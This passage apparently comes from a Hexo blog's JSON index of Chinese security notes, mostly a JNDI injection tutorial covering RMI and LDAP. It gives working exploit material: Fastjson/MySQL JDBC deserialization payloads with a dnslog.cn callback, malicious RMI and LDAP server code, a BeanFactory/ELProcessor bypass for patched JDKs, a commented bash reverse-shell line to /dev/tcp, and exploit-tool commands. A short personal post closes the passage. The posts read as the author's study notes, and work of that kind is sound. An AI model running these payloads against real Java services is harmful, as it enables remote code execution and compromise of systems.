&quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, &quot;autoDeserialize&quot;: &quot;true&quot;, &quot;user&quot;: &quot;yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn&quot;, &quot;PORT.1&quot;: &quot;3306&quot;, &quot;HOST.1&quot;: &quot;172.20.64.40&quot;, &quot;NUM_HOSTS&quot;: &quot;1&quot;, &quot;HOST&quot;: &quot;172.20.64.40&quot;, &quot;DBNAME&quot;: &quot;test&quot; &#125;&#125;LoadBalancedMySQLConnection&#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;, &quot;proxy&quot;: &#123; &quot;connectionString&quot;: &#123; &quot;url&quot;: &quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&quot; &#125; &#125;&#125;UnpooledDataSource&#123; &quot;x&quot;: &#123; &#123; &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;, &quot;name&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot; &#125;, &quot;c&quot;: &#123; &quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;, &quot;key&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassLoader&quot;: &#123; &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driver&quot;: &quot;$$BCEL$$$l$8b$...&quot; &#125; &#125;: &quot;a&quot; &#125;&#125;LoadBalancedMySQLConnection2&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;, &quot;proxy&quot;: &#123; &quot;connectionString&quot;:&#123; &quot;url&quot;:&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;useSSL=false&amp;user=yso_CommonsCollections5_calc&quot; &#125; &#125; &#125;&#125;ReplicationMySQLConnection&#123; &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;, &quot;proxy&quot;: &#123; &quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;, &quot;connectionUrl&quot;:&#123; &quot;@type&quot;:&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;, &quot;masters&quot;:[&#123; &quot;host&quot;:&quot;&quot; &#125;], &quot;slaves&quot;:[], &quot;properties&quot;:&#123; &quot;host&quot;:&quot;127.0.0.1&quot;, &quot;port&quot;:&quot;3306&quot;, &quot;user&quot;:&quot;yso_CommonsCollections4_calc&quot;, &quot;dbname&quot;:&quot;dbname&quot;, &quot;password&quot;:&quot;pass&quot;, &quot;queryInterceptors&quot;:&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, &quot;autoDeserialize&quot;:&quot;true&quot; &#125; &#125; &#125;&#125; 参考https://tttang.com/archive/1579/ https://su18.org/post/fastjson/#7-fastjson-1247","categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"http://example.com/tags/JAVA/"}]},{"title":"JNDI注入-RMI与LDAP的利用","slug":"JNDI注入-RMI与LDAP的利用","date":"2023-04-11T18:45:30.000Z","updated":"2023-08-01T13:14:39.852Z","comments":true,"path":"2023/04/12/JNDI注入-RMI与LDAP的利用/","link":"","permalink":"http://example.com/2023/04/12/JNDI%E6%B3%A8%E5%85%A5-RMI%E4%B8%8ELDAP%E7%9A%84%E5%88%A9%E7%94%A8/","excerpt":"","text":"JNDI注入简介JNDI（Java Naming and Directory Interface，Java命名和目录接口）是一组在Java应用中访问命名和目录服务的API,命名服务将名称和对象联系起来,使得我们可以用名称访问对象。 SPISPI 全称为 Service Provider Interface，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。在 JDK 中包含了下述内置的目录服务: RMI: Java Remote Method Invocation，Java 远程方法调用； LDAP: 轻量级目录访问协议；LDAP 既是一类服务，也是一种协议 CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)； ##JNDI结构 在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是： 12345javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；javax.naming.event：在命名目录服务器中请求事件通知；javax.naming.ldap：提供LDAP支持；javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。 InitialContext类构造方法： 123456//构建一个初始上下文。InitialContext() //构造一个初始上下文，并选择不初始化它。InitialContext(boolean lazy) //使用提供的环境构建初始上下文。InitialContext(Hashtable&lt;?,?&gt; environment) 常用方法： 12345678910//将名称绑定到对象。 bind(Name name, Object obj) //枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。list(String name) //检索命名对象。lookup(String name) //将名称绑定到对象，覆盖任何现有绑定。rebind(String name, Object obj) //取消绑定命名对象。unbind(String name) 例： 1234567891011import javax.naming.InitialContext;import javax.naming.NamingException;public class main &#123; public static void main(String[] args) throws NamingException &#123; String uri = &quot;rmi://127.0.0.1:1099/work&quot;; //初始化上下文，即是获取初始目录环境 InitialContext initialContext = new InitialContext(); initialContext.lookup(uri); &#125;&#125; Reference该类也是在javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能 构造方法: 12345678910111213//为类名为“className”的对象构造一个新的引用。Reference(String className) //为类名为“className”的对象和地址构造一个新引用。 Reference(String className, RefAddr addr) //为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 Reference(String className, RefAddr addr, String factory, String factoryLocation) //为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。 Reference(String className, String factory, String factoryLocation)参数：className 远程加载时所使用的类名factory 加载的class中需要实例化类的名称factoryLocation 提供classes数据的地址可以是file/ftp/http协议 常用方法： 123456789101112131415161718192021222324//将地址添加到索引posn的地址列表中。void add(int posn, RefAddr addr) //将地址添加到地址列表的末尾。 void add(RefAddr addr) //从此引用中删除所有地址。 void clear() //检索索引posn上的地址。 RefAddr get(int posn) //检索地址类型为“addrType”的第一个地址。 RefAddr get(String addrType) //检索本参考文献中地址的列举。 Enumeration&lt;RefAddr&gt; getAll() //检索引用引用的对象的类名。 String getClassName() //检索此引用引用的对象的工厂位置。 String getFactoryClassLocation() //检索此引用引用对象的工厂的类名。 String getFactoryClassName() //从地址列表中删除索引posn上的地址。 Object remove(int posn) //检索此引用中的地址数。 int size() //生成此引用的字符串表示形式。String toString() 常用属性： 123className 远程加载时所使用的类名classFactory 加载的 class 中需要实例化类的名称classFactoryLocation 提供 classes 数据的地址可以是 file/ftp/http 等协议 JNDI注入原理即是控制lookup函数的参数，使得客户端访问恶意的RMI或者LOAP服务来加载恶意对象，从而执行代码，完成利用。 在JNDI服务中，通过绑定一个外部的远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用Reference类实现的，具体是指如果远程获取RMI服务器上的对象为Reference类或者其子类时，可以从其他服务器上加载Class文件来实例化 客户端dns查询demo1234567891011121314151617181920212223package com.example.jndi;import javax.naming.Context;import javax.naming.directory.Attributes;import javax.naming.directory.DirContext;import javax.naming.directory.InitialDirContext;import java.util.Hashtable;public class DNSclient &#123; public static void main(String[] args) &#123; Hashtable &lt;String,String&gt; env = new Hashtable&lt;&gt;(); env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.dns.DnsContextFactory&quot;); env.put(Context.PROVIDER_URL,&quot;dns://114.114.114.114&quot;); try &#123; DirContext dirContext = new InitialDirContext(env); Attributes res = dirContext.getAttributes(&quot;example.com&quot;,new String[]&#123;&quot;A&quot;&#125;); System.out.println(res); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125;//注：114.114.114.114是国内移动、电信和联通通用的DNS，手机和电脑端都可以使用，干净无广告，解析成功率相对来说更高，国内用户使用的比较多，而且速度相对快、稳定，是国内用户上网常用的DNS。8.8.8.8是google的DNS 动态协议切换上面的demo可以发现，初始化 JNDI 上下文主要使用环境变量实现: INITIAL_CONTEXT_FACTORY：指定初始化协议的工厂类 PROVIDER_URL：指定对应名称服务的url地址 但是，实际上在 Context.lookup 方法的参数中，用户可以指定自己的查找协议，我们来看下面的代码: 1234567891011121314151617181920public class JNDIDynamic &#123; public static void main(String[] args) &#123; if (args.length != 1) &#123; System.out.println(&quot;Usage: lookup &lt;domain&gt;&quot;); return; &#125; Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;(); env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.dns.DnsContextFactory&quot;); env.put(Context.PROVIDER_URL, &quot;dns://114.114.114.114&quot;); try &#123; DirContext ctx = new InitialDirContext(env); DirContext lookCtx = (DirContext)ctx.lookup(args[0]); Attributes res = lookCtx.getAttributes(&quot;&quot;, new String[]&#123;&quot;A&quot;&#125;); System.out.println(res); &#125; catch (NamingException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 该demo功能是一个DNS解析，但是，我们也可以通过指定的查找参数去切换查找协议: 这就是 JNDI 注入 的根源所在。通过精心构造服务端的返回，我们可以让请求查找的客户端解析远程代码，最终实现远程命令执行。JDK 中默认支持的 JNDI 自动协议转换以及对应的工厂类如下所示: 协议 schema Context DNS dns:// com.sun.jndi.url.dns.dnsURLContext RMI rmi:// com.sun.jndi.url.rmi.rmiURLContext LDAP ldap:// com.sun.jndi.url.ldap.ldapURLContext LDAP ldaps:// com.sun.jndi.url.ldaps.ldapsURLContextFactory IIOP iiop:// com.sun.jndi.url.iiop.iiopURLContext IIOP iiopname:// com.sun.jndi.url.iiopname.iiopnameURLContextFactory IIOP corbaname:// com.sun.jndi.url.corbaname.corbanameURLContextFactory JNDI-RMI服务端：Server.class 123456789101112131415161718192021222324import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Server &#123; public static void main(String args[]) &#123; try &#123; Registry registry = LocateRegistry.createRegistry(1099); String factoryUrl = &quot;http://localhost:1098/&quot;; Reference reference = new Reference(&quot;EvilClass&quot;,&quot;EvilClass&quot;, factoryUrl); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(&quot;Foo&quot;, wrapper); System.err.println(&quot;Server ready, factoryUrl:&quot; + factoryUrl); &#125; catch (Exception e) &#123; System.err.println(&quot;Server exception: &quot; + e.toString()); e.printStackTrace(); &#125; &#125;&#125; 客户端：Client.class 12345678910111213import javax.naming.InitialContext;import javax.naming.NamingException;public class Client &#123; public static void main(String[] args) &#123; try &#123; Object ret = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/Foo&quot;); System.out.println(&quot;ret: &quot; + ret); &#125; catch (NamingException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 恶意类：Evilcalss.class 1234567891011121314151617181920212223242526272829303132333435363738import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.util.Hashtable;public class EvilClass implements ObjectFactory &#123; static void log(String key) &#123; try &#123; System.out.println(&quot;EvilClass: &quot; + key); &#125; catch (Exception e) &#123; // do nothing &#125; &#125; &#123; EvilClass.log(&quot;IIB block&quot;); //实例初始化块 IIB &#125; static &#123; EvilClass.log(&quot;static block&quot;); //静态代码块 Stctic &#125; public EvilClass() &#123; EvilClass.log(&quot;constructor&quot;); &#125; @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) &#123; EvilClass.log(&quot;getObjectInstance&quot;); return null; &#125;&#125;/****1,静态代码块在类加载的时候执行，只会执行一次,2实例初始化块与静态代码块不同的是它可以被执行多次，每次new一个含实例初始化块的对象都会执行。实例初始话块只有在对象被实例化的时候才会先于构造器被调用，所以静态代码块是先于实例初始化块调用的。执行顺序：static -&gt; IIB -&gt; constructor ###高版本JDK 低版本下可以直接运行，JDK 6u132、7u122、8u113 开始。com.sun.jndi.rmi.object.trustURLCodebase 默认值为false。运行时需加入参数 -Dcom.sun.jndi.rmi.object.trustURLCodebase=true 。因为如果 JDK 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 RMI 代码。不加参数，抛出异常： 原因在于com\\sun\\jndi\\rmi\\registry\\RegistryContext.java中 trustURLCodebase默认是null 在lookup方法中进行了检测 decodeObject方法中 12345678910111213141516171819202122232425262728293031323334353637383940 private Object decodeObject(Remote r, Name name) throws NamingException &#123; try &#123; Object obj = (r instanceof RemoteReference) ? ((RemoteReference)r).getReference() : (Object)r; /* * Classes may only be loaded from an arbitrary URL codebase when * the system property com.sun.jndi.rmi.object.trustURLCodebase * has been set to &quot;true&quot;. */ // Use reference if possible Reference ref = null; if (obj instanceof Reference) &#123; ref = (Reference) obj; &#125; else if (obj instanceof Referenceable) &#123; ref = ((Referenceable)(obj)).getReference(); &#125; if (ref != null &amp;&amp; ref.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) &#123; throw new ConfigurationException( &quot;The object factory is untrusted. Set the system property&quot; + &quot; &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;); &#125; return NamingManager.getObjectInstance(obj, name, this, environment); &#125; catch (NamingException e) &#123; throw e; &#125; catch (RemoteException e) &#123; throw (NamingException) wrapRemoteException(e).fillInStackTrace(); &#125; catch (Exception e) &#123; NamingException ne = new NamingException(); ne.setRootCause(e); throw ne; &#125; &#125;&#125; 分析源码绕过异常抛出ConfigurationException的方法： ref=null ref.getFactoryClassLocation() = null trustURLCodebase = true ####绕过ConfigurationException 解决: 1，ref = null，这点需要rmi既不是Reference也不是Referenceable的引用。这时候客户端直接实例化本地对象，远程 RMI 没有操作的空间，因此这种情况不太好利用； 2，trustURLCodebase = true。如果能使用命令行，可以直接在命令行中设置该变量，如: 1java -Dcom.sun.jndi.rmi.object.trustURLCodebase=true JNDILookup rmi://localhost:1077/Foo 3，ref.getFactoryClassLocation() = null,getFactoryClassLocation()是获取所指对象的对应 factory 名称，对于远程代码加载而言是 codebase，即远程代码的 URL 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 factory 是本地代码，则该值为空，这是绕过高版本 JDK 限制的关键； 满足该条件只需要在rmi服务中返回的Reference对象中不指定Factory的coedbase。（codebase：使用Java语言编写的程序，不仅可以在本地的classpath中加载类，也可以根据需要从网络上下载类。为了使Java程序可以从网络上下载类，我们需要使用codebase，codebase指定了Java程序在网络上何处可以找到需要的类）如： 1Reference reference = new Reference(&quot;EvilClass&quot;); ####NamingManager.getObjectInstance 过了上面的判断之后，return NamingManager.getObjectInstance(obj, name, this, environment);跟进分析下该方法干了什么: ​ 也就是会先从本地的CLASSPATH中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。之后会执行静态代码块、代码块、无参构造函数和getObjectInstance方法。那么只需要在攻击者本地CLASSPATH找到这个Reference Factory类并且在这四个地方其中一块能执行payload就可以了 ​ 由于getObjectInstance方法需要类实现javax.naming.spi.ObjectFactory接口，因此，我们实际上可以指定一个存在于目标CLASSPATH中的工厂类名称，交由这个工厂类去实例化实际的目标类（即引用所指向的类）从而间接实现一定的代码控制 利用getObjectInstance方法可以实例化对象。 调用栈： 1234567InitialContext#lookup() RegistryContext#lookup() RegistryContext#decodeObject() NamingManager#getObjectInstance() objectfactory = NamingManager#getObjectFactoryFromReference() Class#newInstance() //--&gt;恶意代码被执行 或: objectfactory#getObjectInstance() //--&gt;恶意代码被执行 所以，我们需要寻找满足条件的工厂类： 存在于目标本地的 CLASSPATH 中 实现 javax.naming.spi.ObjectFactory 接口 存在 getObjectInstance() 方法 tomcat中的org.apache.naming.factory.BeanFactory满足上述条件。 另外newinstance()创建实例，只能利用无参数构造方法。而且要求目标 class 得有无参构造方法且有办法执行相关命令。 javax.el.ELProcessor满足该条件，另外groovy.lang.GroovyShell也满足该条件。这里先看ELProcessor 在org\\apache\\naming\\factory\\BeanFactory.class中。通过ref.get(&quot;forceString&quot;);来获取forceString对应的值。 后续再通过一系列操作将目标方法javax.el.ELProcessor.eval(java.lang.String)放进hashmap中。对应的键名是 X 所以在exp中需要这样写： 12ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));ref.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&quot;)); 最终获取读出hashmap中的方法invoke调用eval方法，完成rce ELProcessor中的eval方法测试。该方法可以执行EL表达式 1234567import javax.el.ELProcessor;public class demo &#123; public static void main(String[] args) &#123; ELProcessor evil = new ELProcessor(); evil.eval(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&quot;); &#125;&#125; ###exp - RMI RMI服务 - EVILRMI 12345678910111213141516171819202122232425262728package com.example.jndi.RMI;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.StringRefAddr;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import org.apache.naming.ResourceRef;public class EvilRMI &#123; public static void main(String args[]) &#123; try &#123; Registry registry = LocateRegistry.createRegistry(1077); //javax.el.ELProcessor：Tomcat 8+ or SpringBoot 1.2.x+ ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null); ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;)); // ref.add(new StringRefAddr(&quot;x&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;]).start()\\&quot;)&quot;)); ref.add(new StringRefAddr(&quot;x&quot;, &quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&quot;)); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); registry.bind(&quot;calc&quot;, referenceWrapper); System.err.println(&quot;Server ready&quot;); &#125; catch (Exception e) &#123; System.err.println(&quot;Server exception: &quot; + e.toString()); e.printStackTrace(); &#125; &#125;&#125; 其中的org.apache.naming.ResourceRef 在 tomcat 中表示某个资源的引用，指定了资源的实际类为 javax.el.ELProcessor，工厂类为 apache.naming.factory.BeanFactory。x=eval 令上述代码实际执行的是 ELProcessor.eval 函数，其第一个参数是属性 x 的值，这里指定的是弹计算器。 JNDILookup - 客户端： 123456789101112131415package com.example.jndi.RMI;import javax.naming.InitialContext;import javax.naming.NamingException;public class JNDILookup &#123; public static void main(String[] args) &#123; try &#123; Object ret = new InitialContext().lookup(&quot;rmi://localhost:1077/calc&quot;); System.out.println(&quot;ret: &quot; + ret); &#125; catch (NamingException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 另外，使用groovy.lang.GroovyShell也是可以的。原理与上面类似，只是rce的时候略有不同 1234567891011121314151617181920212223242526package com.example.jndi.RMI;import com.sun.jndi.rmi.registry.ReferenceWrapper;import org.apache.naming.ResourceRef;import javax.naming.StringRefAddr;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class EvilRMI_GroovyShell &#123; public static void main(String args[]) &#123; try&#123; Registry registry = LocateRegistry.createRegistry(1077); ResourceRef ref = new ResourceRef(&quot;groovy.lang.GroovyShell&quot;,null,&quot;&quot;,&quot;&quot;,true,&quot;org.apache.naming.factory.BeanFactory&quot;,null); ref.add(new StringRefAddr(&quot;forceString&quot;,&quot;x=evaluate&quot;)); ref.add(new StringRefAddr(&quot;x&quot;,&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;).execute()&quot;)); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); registry.bind(&quot;calc&quot;, referenceWrapper); System.err.println(&quot;Server ready&quot;); &#125;catch (Exception e)&#123; System.err.println(&quot;Server exception: &quot; + e.toString()); e.printStackTrace(); &#125; &#125;&#125; JNDI-LDAP​ LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP/IP协议栈之上，基于C/S架构。 ​ 它是一种数据库，相对于mysql的表型存储；不同的是LDAP使用树型存储因为树型存储，读性能佳，写性能差，没有事务处理、回滚功能。） 除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式： Java序列化 JNDI Reference Marshalled对象 Remote Location (已弃用) LDAP可以为存储的Java对象指定多种属性： javaCodeBase objectClass javaFactory javaSerializedData … 使用这些方法存储在 LDAP 目录中的 Java 对象一旦被客户端解析(反序列化)，就可能会引起远程代码执行。 LDAP树层次分为以下几层： dn：一条记录的详细位置，由以下几种属性组成 dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库） ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支） cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？） 举个例子一条记录就是dn=”uid=songtao.xu,ou=oa,dc=example,dc=com” 无限制测试版本：jdk8U65 前面调用过程类似，在com.sun.jndi.ldap.Obj.java#decodeObject这里。该方法其主要功能是解码从LDAP Server来的对象，该对象可能是序列化的对象（反序列化，也就是8U191后的利用），也可能是一个Reference对象 这里先看Reference 在decodeReference中返回了一个新的对象引用 LDAP的获取对象的方式为根据传入的属性，创建一个新的Reference对象。载判断var0.get(JAVA_ATTRIBUTES[5])是否为空，即判断是否存在javaReferenceAddress。若不存在直接返回新创建的Reference对象var5 return返回，在com\\sun\\jndi\\ldap\\LdapCtx.class中，又和上面的rmi一样，调用了getObjectInstance 跟进看看，其中调用了getObjectFactoryFromReference， 他会先本地查找EXP类，如果不存在，则会通过getFactoryClassLocation远程URL，如果不为空。加载远程恶意类。 调用栈： 这里测试直接用的JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar。（本地搭建ldap服务一直没成功） trustURLCodebase限制jdk11.0.1、8u191、7u201、6u211版本开始默认com.sun.jndi.ldap.object.trustURLCodebase设置为false 在com\\sun\\naming\\internal\\VersionHelper12.java#loadClass中，加入了对trustURLCodebase的检测，loadclass的时候，如果trustURLCodebase = false则直接返回null。加载远程的字节码不会执行成功。 绕过限制方法：使用序列化数据,触发本地Gadget 原因在于：LDAP中的数据可以是序列化对象，如果序列化对象会调用deserializeObject方法（最终调用readobject），返回一个反序列化对象，从而造成反序列化漏洞 EXP-LDAP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package com.example.jndi.LDAP;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import com.unboundid.util.Base64;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;public class EVIL_LDAP &#123; private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;; public static void main ( String[] tmp_args ) throws Exception&#123; String[] args=new String[]&#123;&quot;http://localhost/#Evil&quot;&#125;; int port = 6666; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( &quot;listen&quot;, //$NON-NLS-1$ InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$ ds.startListening(); &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;)); System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl); e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(&#x27;#&#x27;); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;Base64encode Gaget&quot;)); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; 一个搬来的图 - 各版本的注入方法 工具使用###JNDI-Injection-Exploit 该工具中没有实现ldap在8U191后的功能，应为涉及到了反序列化利用链。是不是可以尝试结合一下ysoserial魔改一下呢 jndi注入工具 12-C 命令 -A IPjava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A &quot;127.0.0.1&quot; 提供了绕过trustURLcodebae = false的和trustURLcodebae = turepaylaod ###marshalsec 用于搭建rmi服务和ldap服务 使用方法: 在pom.xml文件路径下使用命令mvn clean package -DskipTests,打包项目，生成的jar报包在target目录下 123#启动ldap服务E:\\java_file\\JNDI\\src\\main\\java\\com\\example\\jndi\\LDAPjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/E:\\java_file\\JNDI\\src\\main\\java\\com\\example\\jndi\\LDAP/#Exploit 8088 注：看起来奇怪的代码：带有$符号的变量名字，就是普通变量没有特殊含义 1$在java代码里面用做命名规范的话一般表示内部或临时变量。有些用idea反编译出来的代码也存在比如class$1这种看似毫不相关的变量，因为可能有编译优化，生成的字节码再逆向回来会稍有不同 参考 https://evilpan.com/2021/12/13/jndi-injection/#normal-jndi https://tttang.com/archive/1611/#toc_jndi_rmi https://tttang.com/archive/1405/ https://www.cnblogs.com/yyhuni/p/15088134.html#%E4%BA%8C8u191%E4%B9%8B%E5%89%8D","categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"http://example.com/tags/JAVA/"}]},{"title":"新的开始","slug":"新的开始","date":"2023-03-09T06:13:10.000Z","updated":"2023-08-02T06:43:18.311Z","comments":true,"path":"2023/03/09/新的开始/","link":"","permalink":"http://example.com/2023/03/09/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/","excerpt":"","text":"​ 去年搭的博客因为服务器到期没续费全没了，想想还挺可惜的。算了，重新开始！以后就更新一些笔记和wp，起码在学习路上留下点痕迹，给自己看！","categories":[],"tags":[]}],"categories":[{"name":"RedTeam","slug":"RedTeam","permalink":"http://example.com/categories/RedTeam/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"代码审计","slug":"代码审计","permalink":"http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"RedTeam","slug":"RedTeam","permalink":"http://example.com/tags/RedTeam/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"JAVA","slug":"JAVA","permalink":"http://example.com/tags/JAVA/"}]}